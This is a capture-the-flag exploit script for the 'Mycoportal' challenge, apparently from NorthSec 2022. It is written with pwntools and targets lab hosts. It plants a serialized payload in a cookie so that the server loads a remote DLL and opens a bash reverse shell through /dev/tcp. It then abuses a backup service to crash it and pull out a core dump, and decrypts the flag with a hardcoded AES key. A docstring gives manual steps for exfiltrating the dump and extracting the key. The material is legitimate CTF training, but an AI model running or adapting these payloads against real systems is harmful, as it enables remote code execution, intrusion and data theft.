#!/bin/env python
"""
Mycoportal - Flag 2

The second flag is located on the web portal host and requires several steps to solve.

The player is expected to:

1. Locate the backup application and its todo list which contains the hint flag.
2. Exfiltrate the binaries and reverse them to find the stackoverflow bug in the backup service
3. Exfiltrate an encrypted copy of the flag.txt
4. Use the stackoverflow to produce a crash dump of the backup service
5. Use the arbitrary file read to "backup" the crashdump
6. Exfiltrate the crash dump and use dump analysis (dotnet-dump or ClrMD) to extract the encryption key.
7. Use the key to decrypt the flag. 
"""


from gzip import compress
from base64 import b64encode, b64decode
from urllib.parse import quote
from os import path, chdir

from requests import Session
import threading
from pwn import *
context.log_level = 'info'

import http.server
import socketserver
from Crypto.Cipher import AES

PAYLOAD_PATH = "."
PAYLOAD_DLL = "Payloads.dll"
DEBUG = True

LHOST = 'shell.ctf'
LPORT = 8882

RHOST='mycoportal.ctf'  # mycoportal.ctf
RPORT=80

FLAG = b64decode('qus/JDgH2Jx8yRv5t6x+ZDIA+86mSMcoyPTlaN5so8NO7ZSw48iZbsf6gAfXnK1WORM7jOh2+elIZAHCz4mcrg==')  # Taken from backed up flag (`backup /etc/backup/flag.txt`)

def decrypt(flag):
    iv = flag[:16]
    data = flag[16:]
    key = b64decode('v9wWJ3wK+M101IFphiw37o7tmrvOPk1NKlWb5x40XPY=')
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    plaintext = cipher.decrypt(data)
    return plaintext[:45]

# ----------------------------------------
def encode(data):
    """
    Encodes the payload by applying the following transforms:

        quote(b64(gzip(payload)))
    
    and returns it.
    """
    gzipped = compress(data)
    encoded = b64encode(gzipped)
    return quote(encoded)

class V6Server(socketserver.TCPServer):
    address_family = socket.AF_INET6
    allow_reuse_address = True

class HttpServer(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self, daemon=True)
    
    def run(self):
        with V6Server(("::", LPORT), http.server.SimpleHTTPRequestHandler) as httpd:
            info(f"Spawning HTTP server on port [::]:{LPORT}")
            httpd.serve_forever()

def get_between(body, start, end):
    """
    Extracts the string that comes between `start` and `end` inside the body.

    # Examples

    ```
    b = get_between("Lorem ipsum dolor sit amet", "ipsum", "amet").strip()
    assert(b == "dolor sit")
    ````

    """
    s = body.find(start)
    t = body.find(end, s+len(start))
    ret = body[s+len(start):t]
    return ret

def exec(s, cmd):
    info(f"Command: {cmd}")
    s.sendline(f'{cmd} ; echo -e "\\x7e\\x7e\\x7e"')
    output = s.recvuntil('~~~')
    return output.replace(b'~~~', b'')

# LEVEL 2 EXPLOIT
def exploit_level2(shell):
    
    shell.recvuntil('$ ')
    # Check if hint 2 flag is there.
    todo = exec(shell, "cat /app/backupsvc/todo.txt")
    if b'FLAG' in todo:
        success("Hint 2 flag found!")
    else:
        error("Hint 2 flag not found!")

    # Backup flag.txt
    exec(shell, "echo 'backup /etc/backup/flag.txt' | nc -q 10 -w 10 ::1 3388")

    # Test that flag.txt backed up successfully.
    encrypted = exec(shell, "ls -1 /var/backups/flag.txt")

    if b"flag.txt" in encrypted:
        success("Encrypted flag backed up")


    info("Preparing symlink loop")
    exec(shell, "ln -sf /tmp/a /tmp/a")   


    # Make the backup service crash
    info("Triggering crash")
    exec(shell, "echo 'backup /tmp/a' | nc ::1 3388")

    sleep(5)
    # Get crash dump name
    coredump = exec(shell, "ls -1 /var/lib/systemd/coredump/core.Myco*")
    
    if b'core.Mycoverse' in coredump:
        success("Core dump successfully generated")
    else:
        error("No coredump generated")

    # Backup crashdump
    info(f"Reading crash dump")

    dump = str(exec(shell, 'find /var/lib/systemd/coredump/*.lz4 | tail -1'), 'utf8')
    dump = '/var' + get_between(dump, '/var', '.lz4') + '.lz4'
    success(f"Found dump: {dump}")

    exec(shell, f'echo "backup {dump}" | nc -q 5 -w 5 ::1 3388')

    # exfil = str(exec(shell, f'echo -e "\\x2d\\x2d\\x2d\\x2d"; base64 $(ls -1 /var/backups/*.lz4 | tail -1); echo -e "\\x2d\\x2d\\x2d\\x2d"'), 'utf8')
    # exfil = get_between(exfil, '----\n', '\n----')
    # success(f'exfil bytes: {len(exfil)}')
    # with open('core.dmp', 'wb') as o:
    #     o.write(bytes(exfil, 'utf8'))
    
    # Decrypt the backed up flag
    flag = str(exec(shell, f'echo -e "\\x2d\\x2d\\x2d\\x2d"; base64 -w0 /var/backups/flag.txt; echo -e "\\x2d\\x2d\\x2d\\x2d"'), 'utf8')
    flag = get_between(flag, '----\n', '\n----')
    flag = decrypt(flag)
    
    if flag == 'FLAG-8974735b34d02d0a406b8fc6ae2af898d824798e':
        success(f'Found Flag 2: {flag}')
    else:
        error('Failed to solve flag 2')

    
    # TODO: Automate coredump exfil and key extraction ...
    """
    For now, manual solution:
    
    # 1. Exfil the core dump.
    
    LHOST: nc -6 -lvvtp 8888 > core.b64
    RHOST: base64 'core.Mycoverse\x2eServi.0.aaca20afa135489798a8a7a7acb5adbc.14005.1651416953000000000000.lz4' > /dev/tcp/$RHOST/8888
    
    LHOST: 
    base64 -d core.b64 > core.lz4
    lz4 -d core.lz4 core.dmp

    # 2. Analyze the data to extract the key

    dotnet-dump analyze core.dmp

    # NOTE: Addresses will vary...
    > dumpheap -type CryptographyOptions
    ```
            Address               MT     Size
    00007f4720036128 00007f4a385f7418       24
    00007f4720036298 00007f4a385f7548       32
    00007f4720036318 00007f4a385f76e8       32
    00007f4720036338 00007f4a385f7960       32
    00007f4720036358 00007f4a385f7a10       64
    00007f4720081d50 00007f4a3872e798       32
    00007f4720081d70 00007f4a3872e910       24
    00007f4720081da0 00007f4a3872ea88       24
    00007f4720081e48 00007f4a38622130       40
    00007f4720081e88 00007f4a38622010       40
    00007f4720081fe8 00007f4a385f1ac8       32

    Statistics:
                MT    Count    TotalSize Class Name
    00007f4a3872ea88        1           24 Microsoft.Extensions.Options.IValidateOptions`1[[Mycoverse.Common.Options.CryptographyOptions, Mycoverse.Common]][]
    00007f4a3872e910        1           24 Microsoft.Extensions.Options.IPostConfigureOptions`1[[Mycoverse.Common.Options.CryptographyOptions, Mycoverse.Common]][]
    00007f4a385f7418        1           24 Microsoft.Extensions.DependencyInjection.OptionsConfigurationServiceCollectionExtensions+<>c__1`1[[Mycoverse.Common.Options.CryptographyOptions, Mycoverse.Common]]
    00007f4a3872e798        1           32 Microsoft.Extensions.Options.IConfigureOptions`1[[Mycoverse.Common.Options.CryptographyOptions, Mycoverse.Common]][]
    00007f4a385f7960        1           32 Microsoft.Extensions.Options.NamedConfigureFromConfigurationOptions`1+<>c__DisplayClass1_0[[Mycoverse.Common.Options.CryptographyOptions, Mycoverse.Common]]
    00007f4a385f76e8        1           32 Microsoft.Extensions.Options.NamedConfigureFromConfigurationOptions`1[[Mycoverse.Common.Options.CryptographyOptions, Mycoverse.Common]]
    00007f4a385f7548        1           32 Microsoft.Extensions.Options.ConfigurationChangeTokenSource`1[[Mycoverse.Common.Options.CryptographyOptions, Mycoverse.Common]]
    00007f4a385f1ac8        1           32 Mycoverse.Common.Options.CryptographyOptions
    00007f4a38622130        1           40 Microsoft.Extensions.Options.OptionsFactory`1[[Mycoverse.Common.Options.CryptographyOptions, Mycoverse.Common]]
    00007f4a38622010        1           40 Microsoft.Extensions.Options.UnnamedOptionsManager`1[[Mycoverse.Common.Options.CryptographyOptions, Mycoverse.Common]]
    00007f4a385f7a10        1           64 System.Action`1[[Mycoverse.Common.Options.CryptographyOptions, Mycoverse.Common]]
    Total 11 objects
    ```

    > dumpheap -mt 00007f4a385f1ac8
    ```
            Address               MT     Size
    00007f4720081fe8 00007f4a385f1ac8       32

    Statistics:
                MT    Count    TotalSize Class Name
    00007f4a385f1ac8        1           32 Mycoverse.Common.Options.CryptographyOptions
    Total 1 objects
    ```

    > do 00007f4720081fe8

    ```
    Name:        Mycoverse.Common.Options.CryptographyOptions
    MethodTable: 00007f4a385f1ac8
    EEClass:     00007f4a385e9bc0
    Tracked Type: false
    Size:        32(0x20) bytes
    File:        /home/dom0/Code/github.com/nsec/ctf-2022/challenges/abeaulieu/src/Mycoverse.Services.Backup/bin/Debug/net6.0/Mycoverse.Common.dll
    Fields:
                MT    Field   Offset                 Type VT     Attr            Value Name
    00007f4a37e2d2e0  4000006        8        System.String  0 instance 00007f481ffff3a0 <Keyfile>k__BackingField
    00007f4a38084298  4000007       10        System.Byte[]  0 instance 00007f472008c350 _key
    00007f4a3872ee78  4000005       10        System.Random  0   static 00007f4720082008 Rand
    00007f4a38084298  4000008       18        System.Byte[]  0   static 00007f4720082050 NullKey
    ```

    > do 

    ```
    00007f472008c350                                                                                                       
    Name:        System.Byte[]
    MethodTable: 00007f4a38084298
    EEClass:     00007f4a38084228
    Tracked Type: false
    Size:        56(0x38) bytes
    Array:       Rank 1, Number of elements 32, Type Byte
    Content:     ...'|...t..i.,7......>MM*U...4\.
    Fields:
    None
    ```

    Remember to skip the 0x10 bytes from the object metadata!

    > db -c 32 00007f472008c360                                                                                             
    ```
    00007f472008c360: bf dc 16 27 7c 0a f8 cd 74 d4 81 69 86 2c 37 ee  ...'|...t..i.,7.
    00007f472008c370: 8e ed 9a bb ce 3e 4d 4d 2a 55 9b e7 1e 34 5c f6  .....>MM*U...4\.
    ```
    """

    # Decrypt the flag.
    success(decrypt(FLAG))


def main():
    chdir(PAYLOAD_PATH)
    httpd = HttpServer()
    httpd.start()
    sleep(2)  # Allow some time for the socket to bind.

    # Build payload and serialize it
    rawPayload = f"http://{LHOST}:{LPORT}/{PAYLOAD_DLL}!Payloads.Execute🍄Cmd💬bash -i >& /dev/tcp/{LHOST}/{LPORT+1} 0>&1🛑"

    payload = bytes(rawPayload, 'utf8')
    encoded = encode(payload)

    info(f"Listening for connection on {LPORT+1}")
    
    shell = listen(LPORT + 1)
    S = Session()
    resp = S.get(f'http://{RHOST}:{RPORT}', cookies={'s': encoded})
    shell.wait_for_connection()

    success("Established reverse shell")
    shell.interactive()
    exploit_level2(shell)

main()
